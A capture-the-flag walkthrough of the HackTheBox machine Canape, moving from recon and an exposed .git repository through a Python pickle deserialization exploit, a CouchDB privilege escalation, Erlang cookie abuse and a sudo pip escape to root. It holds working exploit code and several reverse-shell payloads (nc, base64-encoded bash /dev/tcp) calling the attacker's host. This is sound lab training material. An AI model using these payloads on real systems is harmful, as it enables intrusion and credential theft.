# HackTheBox Canape

> Author: Hades

> [*Scripting here*](https://github.com/leecybersec/scripting)

![](images/1.png)

## Information Gathering

### Openning Services

```
### Port Scanning ############################
nmap -sS -Pn -p- --min-rate 1000 10.10.10.70
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

[+] Openning ports: 80,65535

### Services Enumeration ############################
nmap -sC -sV -Pn 10.10.10.70 -p80,65535
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 14:39 +07
Nmap scan report for 10.10.10.70
Host is up (0.28s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
```

### Apache httpd 2.4.18

At port 80, the web application developed by Simpson from 2018.

![](images/2.png)

List of the hidden in the server using `wfuzz`

```
┌──(Hades㉿10.10.14.6)-[0.4:25.2]~
└─$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 --hl 82 'http://10.10.10.70/FUZZ'
<snip>
Target: http://10.10.10.70/FUZZ
Total requests: 4681
<snip>
000000012:   200        9 L      43 W       1075 Ch     ".git/index"
000000013:   200        17 L     70 W       1130 Ch     ".git/logs/"
000000011:   200        11 L     29 W       259 Ch      ".git/config"
000000010:   200        1 L      2 W        23 Ch       ".git/HEAD"
000000008:   301        9 L      28 W       309 Ch      ".git"
000001026:   403        11 L     32 W       294 Ch      "cgi-bin/"
000001060:   405        4 L      23 W       178 Ch      "check"
000003371:   200        85 L     227 W      3150 Ch     "quotes"
000003682:   403        11 L     32 W       299 Ch      "server-status"
000003923:   301        9 L      28 W       311 Ch      "static"
000003967:   200        81 L     167 W      2836 Ch     "submit"
<snip>
```

Based on `nmap` and `wfuzz` result, I saw this web app public folder `.git` and it's may leak some sensitive source code.

Dump folder `.git` if repo not available using [GitHacker](https://github.com/WangYihang/GitHacker), [git_dumper](https://github.com/arthaud/git-dumper) or command

```
wget --mirror -I .git example.com/.git/
```

Checking config file, the source code is currently at repo `http://git.canape.htb/simpsons.git`.

```
┌──(Hades㉿10.10.14.6)-[1.2:47.4]~/scripting/services
└─$ curl http://10.10.10.70/.git/config                                                                                                                          
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://git.canape.htb/simpsons.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
```

Add domain `git.canape.htb` with `10.10.10.70` to file hosts and clone the source code.

```
┌──(Hades㉿10.10.14.6)-[1.2:47.4]~/walkthrough/hackthebox/canape
└─$ git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), 163.16 KiB | 278.00 KiB/s, done.
```

Folder `simpsons`

```
┌──(Hades㉿10.10.14.6)-[1.2:46.3]~/walkthrough/hackthebox/canape
└─$ tree simpsons          
simpsons
├── __init__.py
├── static
│   ├── css
│   │   ├── bootstrap.min.css
│   │   ├── bootstrap.min.css.map
│   │   └── custom.css
│   └── js
│       ├── bootstrap.min.js
│       └── bootstrap.min.js.map
└── templates
    ├── index.html
    ├── layout.html
    ├── quotes.html
    └── submit.html
```

## Foothold

### Insecure Deserialization

In file `__init__.py`, there is two interested function

Function uri `/submit`

``` python
@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
        	# Add value for char from request
            char = request.form["character"]
            # Add value for quote from request
            quote = request.form["quote"]
            # Return error if both don't have value
            if not char or not quote: 
                error = True
            # Return error if char not in scope of whitelist
            elif not any(c.lower() in char.lower() for c in WHITELIST): 
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                # Create file name to save value from request
                p_id = md5(char + quote).hexdigest() 
                # open file $(p_id) and write permission
                outfile = open("/tmp/" + p_id + ".p", "wb")
        # Save value to file name $(p_id)
		outfile.write(char + quote) 
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)
```

Function uri `/check`

``` python
@app.route("/check", methods=["POST"])
def check():
	# Add path file $(id) in tmp folder
    path = "/tmp/" + request.form["id"] + ".p"
    # Open file path with read permission
    data = open(path, "rb").read()

    # Check if "p1" in data call function cPickle.loads(data)
    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item
```

When application call function `cPickle.loads(data)`, the data will load from submited file before. Searching for Pickle vulnerability,

[Exploiting misuse of Python's "pickle"](https://blog.nelhage.com/2011/03/exploiting-pickle/) show how to inject shell code to function `__reduce__`

`pickle` allows arbitrary objects to declare how they should be pickled by defining a [\_\_reduce\_\_](https://docs.python.org/3/library/pickle.html#object.__reduce__) method, which should return either a string or a tuple describing how to reconstruct this object on unpacking. In the simplest form, that tuple should just contain

 * A callable (which must be either a class, or satisfy some other, odder, constraints), and
 * A tuple of arguments to call that callable on.

`pickle` will pickle each of these pieces separately, and then on unpickling, will call the callable on the provided arguments to construct the new object.

And so, we can construct a pickle that, when un-pickled, will execute reverse shell with nc, as follows:

``` python
import os, cPickle
import subprocess
import base64

class RunBinSh(object):
  def __reduce__(self):
    return (os.system, ('nc -nv 10.10.14.6 443 -e /bin/sh',))

data = cPickle.dumps(RunBinSh())

print base64.b64encode(data)

item = cPickle.loads(data)
```

Quick poc exploit

``` python
import os, requests
import cPickle
from hashlib import md5

class exploit(object):
    def __reduce__(self):
        return (os.system, ('echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f',))

url = "http://10.10.10.70"

data = cPickle.dumps(exploit())
char, quote = data.split('!')

#Sent payload
r = requests.post(url + "/submit", data={'character':char, 'quote':quote})

p_id = md5(char + quote).hexdigest()

#Trigger payload
r = requests.post(url + "/check", data={'id':p_id})
```

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/canape)

Run exploit `pickle-canape.py`.

+ Function `create_payload`: Create payload contain data after dump `class Shell` with `cPickle.dumps`. Class Shell must contain string in white list to bypass check.
+ Get file name by hashing md5 value in `char` and `quote`
+ Sent another request to call function check at `/check` to trigger payload

```
┌──(Hades㉿10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape
└─$ python pickle-canape.py 10.10.10.70                                                                                                                                 7 ⨯

>> http://10.10.10.70:80/submit ... 

[+] File name: 59d0b71be7d949629edf95b0dbe881cb

>> http://10.10.10.70:80/check ...
```

At listener, I have reverse shell

```
┌──(Hades㉿10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 40798
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

### Local enumeration

At file `__init__.py`, I also know the server was using `couchdb` database at localhost port 5984 with database named simpsons.

``` python
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]
```

Checking running service

```
www-data@canape:/var/www/html$ netstat -antup
<snip>              
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:38592           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -              
<snip>
```

Follow [CouchDB's Documents](https://docs.couchdb.org/en/latest/intro/tour.html), checking running service with curl, the CouchDB's version is 2.0.0

```
www-data@canape:/var/www/html$ curl 127.0.0.1:5986
{"couchdb":"Welcome","uuid":"132586dfde75b957085d59a5096e9c20","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
www-data@canape:/var/www/html$ curl 127.0.0.1:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

There is database `_users`, `passwords`, `simpsons`, we need to query.

```
www-data@canape:/var/www$ curl -X GET http://127.0.0.1:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

2 database `_users` and `passwords` require authentucation to query, let's check database `simpsons` first.

```
www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}
www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/passwords/_all_docs
{"error":"unauthorized","reason":"You are not authorized to access this db."}
www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/simpsons/_all_docs
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
<snip>
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```

Database `simpsons` just save normal data for user input in the web application

```
www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\
> f0042ac3dc4951b51f056467a1000dd9
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
<snip>
www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\
> f53679a526a868d44172c83a6100451b
{"_id":"f53679a526a868d44172c83a6100451b","_rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39","character":"Moe","quote":"Oh, business is slow. People today are healthier and drinking less. You know, if it wasn't for the junior high school next door, no one would even use the cigarette machine."}
```

Search public exploit for `couchdb`, I saw an interested exploit.

```
┌──(Hades㉿10.10.14.6)-[1.7:44.9]~/walkthrough/hackthebox/canape
└─$ searchsploit couchdb 2.0.0
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Esca | linux/webapps/44498.py
Apache CouchDB 2.0.0 - Local Privilege Escalation          | windows/local/40865.txt
Apache CouchDB < 2.1.0 - Remote Code Execution             | linux/webapps/44913.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Apache CouchDB PE

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/canape)

Using exploit `linux/webapps/44498.py`, I create a credential `hades:leecybersec` as a admin in the database.

```
www-data@canape:/tmp$ python 44498.py -P leecybersec -u hades -p 5984 127.0.0.1
[+] User to create: hades
[+] Password: leecybersec
[+] Attacking host 127.0.0.1 on port 5984
[+] User hades with password leecybersec successfully created.
```

We also run curl with function PUT to sent the payload

```
curl -X PUT -d '{"type":"user","name":"leevn", "roles":["_admin"],"roles":[],"password":"leevn"}' localhost:5984/_users/org.couchdb.user:leevn -H "Content-Type:application/json"
{"ok":true,"id":"org.couchdb.user:leevn","rev":"1-de62ec86a122727ccc9844ab17419a37"}
```

Back to database `passwords` and run query command with new admin credential

```
www-data@canape:/tmp$ curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/_all_docs

{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

Query single id and get value:

```
curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

The user stored their password in database passwords and admin was warning them. Let's use knows password for SSH service.

I successfully login with credential `homer:0B4jyA0xtytZi7esBNGp`

```
┌──(Hades㉿10.10.14.6)-[1.6:45.9]~
└─$ sshpass -p 0B4jyA0xtytZi7esBNGp ssh homer@10.10.10.70 -p 65535
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5
homer@canape:~$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)
```

### Erlang CouchDB Local PrivEscal

Checking running service, I saw the command line `-setcookie monster`

```
www-data@canape:/home$ ps aux | grep couchdb                    
root        639  0.0  0.0   4240   644 ?        Ss   Apr13   0:00 runsv couchdb
root        641  0.0  0.0   4384   676 ?        S    Apr13   0:00 svlogd -tt /var/log/couchdb
homer       642  0.4  3.5 649344 34920 ?        Sl   Apr13   1:11 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
www-data   1587  0.0  0.1  11284  1020 pts/0    S+   01:37   0:00 grep couchdb
```

Using cookie `monster` and go to Erlang

```
www-data@canape:/home$ HOME=/ erl -sname 0xdf -setcookie monster
Eshell V7.3  (abort with ^G)
(0xdf@canape)1> os:cmd("id").
"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
```

Using `rpc module` of Erlang and call to CouchDB

```
(0xdf@canape)2> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
```

Create homer shell

```
(0xdf@canape)3> rpc:call('couchdb@localhost', os, cmd, ["echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQ== | base64 -d | bash"]).
```

At listener, I have reverse shell

```
┌──(Hades㉿10.10.14.6)-[1.0:39.5]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 43496
sh: 0: can't access tty; job control turned off
$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)
```

### Sudo Pip Command

```
homer@canape:~$ sudo -l
[sudo] password for homer: 
<snip>

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

Server allow execute `/usr/bin/pip install *` as root without require password. Based on [GTFOBins/pip](https://gtfobins.github.io/gtfobins/pip/#shell), I create a root shell.

```
homer@canape:~$ TF=$(mktemp -d)                                                                                                                      
homer@canape:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py                                      
homer@canape:~$ sudo /usr/bin/pip install $TF                                                                                                        
<snip>                                                         
Processing /tmp/tmp.vuft5MuGm7                                                                                                                       
# id
uid=0(root) gid=0(root) groups=0(root)
```